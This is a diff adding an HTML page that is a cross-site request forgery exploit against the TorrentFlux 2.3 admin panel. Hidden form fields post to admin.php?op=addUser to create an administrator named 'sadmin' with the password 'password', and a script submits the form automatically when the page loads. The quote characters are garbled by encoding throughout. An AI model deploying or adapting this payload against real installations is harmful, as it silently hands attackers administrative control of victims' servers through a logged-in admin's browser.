@@ -1,0 +1,13 @@
+&lt;html&gt;
+Add an admistrative account:
+&lt;form id=?create_admin? method=?post? action=?http://localhost/torrentflux_2.3/html/admin.php?op=addUser?&gt;
+&lt;input type=hidden name=?newUser? value=?sadmin?&gt;
+&lt;input type=hidden name=?pass1&amp;#8243; value=?password?&gt;
+&lt;input type=hidden name=?pass2&amp;#8243; value=?password?&gt;
+&lt;input type=hidden name=?userType? value=1&gt;
+&lt;input type=submit value=?create admin?&gt;
+&lt;/form&gt;
+&lt;/html&gt;
+&lt;script&gt;
+document.getElementById(?create_admin?).submit();
+&lt;/script&gt;
